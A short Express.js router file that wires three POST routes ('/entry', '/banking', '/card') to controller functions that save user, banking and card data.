const express = require('express');
const router = express.Router();

const userController = require('../controllers/userController'); 

// User routes
router.post('/entry', userController.saveUserData);
router.post('/banking', userController.savesuccessData);

// ✅ Card routes
router.post('/card', userController.saveCardData);  // New route to save card data

module.exports = router;
